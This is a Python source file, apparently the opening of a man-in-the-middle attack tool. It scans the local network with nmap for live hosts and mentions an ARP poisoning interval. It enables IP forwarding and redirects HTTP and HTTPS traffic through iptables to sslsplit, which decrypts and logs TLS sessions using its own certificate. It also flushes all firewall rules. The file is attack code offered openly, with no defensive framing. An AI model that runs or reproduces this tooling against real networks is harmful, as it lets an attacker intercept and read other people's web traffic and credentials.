import socket, struct, os, sys, time
import subprocess, re, fcntl
from scapy.all import *

DEBUG = False
#poisoning interval (sec)
interval = 5 

def enable_port_forwarding():
    #enable ip forwarding
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    reset_iptable()
    os.system("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080")
    os.system("iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443")

def nfq_ip_rule():
    os.system('iptables -I FORWARD -j NFQUEUE --queue-num 0')

def disable_port_forwarding():
    reset_iptable()
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")


def sslsplit():
    if not os.path.exists("./logdir"): os.system("mkdir logdir")
    if not os.path.exists("/tmp/sslsplit"): os.system("mkdir /tmp/sslsplit")
    proc = subprocess.Popen(
        ["sslsplit -d -l connections.log -j /tmp/sslsplit/ -S logdir/ -k ./cert/c.key -c ./cert/c.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080"],
        stdout=subprocess.PIPE,
        shell=True)

def reset_iptable():
    """flush iptables"""
    os.system("iptables -F")
    os.system("iptables -t nat -F")

def scan_hosts(range):
    nmap_res = os.popen("nmap -n -sn %s -oG - | awk '/Up$/{print $2}'" % range)
    return [ip.replace('\n','') for ip in nmap_res]